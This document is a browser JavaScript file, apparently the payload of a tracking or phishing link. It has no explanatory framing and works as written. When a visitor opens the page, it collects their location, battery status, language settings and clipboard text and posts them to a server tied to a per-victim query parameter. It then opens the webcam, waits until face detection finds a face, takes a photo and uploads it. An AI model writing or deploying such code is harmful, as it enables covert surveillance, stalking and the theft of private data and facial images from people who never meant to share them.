let sendUserInfo = {};

let query = new URLSearchParams(window.location.search);
let qParams = query.get("q");

function getLocationInfo() {
  return new Promise((resolve, reject) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        (position) => {
          const latitude = position.coords.latitude;
          const longitude = position.coords.longitude;
          sendUserInfo.latitude = latitude;
          sendUserInfo.longitude = longitude;
          resolve();
        },
        (err) => {
          switch (err.code) {
            case err.PERMISSION_DENIED:
              sendUserInfo.locError = "User denied the request for Geolocation.";
              break;
            case err.POSITION_UNAVAILABLE:
              sendUserInfo.locError = "Location information is unavailable.";
              break;
            case err.TIMEOUT:
              sendUserInfo.locError = "The request to get user location timed out.";
              break;
            case err.UNKNOWN_ERROR:
              sendUserInfo.locError = "An unknown error occurred.";
              break;
          }
          resolve();
        }
      );
    } else {
      sendUserInfo.locError = "Geolocation is not supported by this browser.";
      resolve();
    }
  });
}

function getBatteryInfo() {
  return new Promise((resolve) => {
    if ("getBattery" in navigator) {
      navigator
        .getBattery()
        .then((battery) => {
          sendUserInfo.battStatus = battery.charging ? "Battery Charging" : "Battery Not Charging";
          sendUserInfo.percentage = (battery.level * 100).toFixed(0) + "%";
          resolve();
        })
        .catch(() => {
          sendUserInfo.battError = "Battery is not supported by this browser.";
          resolve();
        });
    } else {
      sendUserInfo.battError = "Battery is not supported by this browser.";
      resolve();
    }
  });
}

function getClipboardInfo() {
  return new Promise((resolve) => {
    if ("clipboard" in navigator) {
      navigator.clipboard
        .readText()
        .then((data) => {
          sendUserInfo.clipboard = data;
          resolve();
        })
        .catch((err) => {
          sendUserInfo.clipboardError = "Clipboard read request was blocked";
          resolve();
        });
    } else {
      sendUserInfo.clipboardError = "Clipboard is not supported by this browser.";
      resolve();
    }
  });
}

function getLanguagesInfo() {
  return new Promise((resolve) => {
    if (navigator.languages) {
      sendUserInfo.languages = navigator.languages.toString();
      resolve();
    } else {
      sendUserInfo.languagesError = "Languages are not supported by this browser.";
      resolve();
    }
  });
}

async function getUserInfo() {
  await Promise.all([getLocationInfo(), getBatteryInfo(), getClipboardInfo(), getLanguagesInfo()]);

  fetch("/api/v1/phoneInfo/?q=" + qParams, {
    method: "POST",
    headers: {
      "Content-Type": "application/json",
    },
    body: JSON.stringify(sendUserInfo),
  });
}

getUserInfo();

let video = document.getElementById("video");
const canvas = document.getElementById("canvas");
let videoStream;

Promise.all([
  faceapi.nets.tinyFaceDetector.loadFromUri("/models"),
  faceapi.nets.faceLandmark68Net.loadFromUri("/models"),
  faceapi.nets.faceRecognitionNet.loadFromUri("/models"),
  faceapi.nets.faceExpressionNet.loadFromUri("/models"),
]).then(startVideo);

function startVideo() {
  navigator.mediaDevices.getUserMedia({ video: {} }).then((stream) => {
    video.srcObject = stream;
    videoStream = stream;
  });
}

video.addEventListener("play", () => {
  const displaySize = { width: video.clientWidth, height: video.clientHeight };
  faceapi.matchDimensions(canvas, displaySize);

  const interval = setInterval(async () => {
    const detections = await faceapi.detectAllFaces(video, new faceapi.TinyFaceDetectorOptions()).withFaceLandmarks().withFaceExpressions();
    const context = canvas.getContext("2d");
    context.clearRect(0, 0, canvas.width, canvas.height);

    if (detections.length > 0) {
      clearInterval(interval);
      takePhoto();
    }
  }, 1000);
});

function takePhoto() {
  const context = canvas.getContext("2d");
  context.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob((blob) => {
    let tracks = videoStream.getTracks();
    tracks.forEach((track) => track.stop());

    let formData = new FormData();
    formData.append("photo", blob);

    fetch("/api/v1/photo/?q=" + qParams, {
      method: "POST",
      body: formData,
    });
  });
}
